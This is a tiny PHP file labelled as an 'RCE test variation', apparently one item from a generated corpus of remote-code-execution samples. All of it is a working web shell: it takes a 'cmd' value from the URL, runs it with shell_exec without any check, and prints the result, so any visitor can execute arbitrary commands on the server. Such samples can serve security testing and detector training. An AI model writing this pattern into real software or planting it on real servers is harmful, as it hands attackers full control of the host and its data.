<?php
// RCE test variation #1125
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>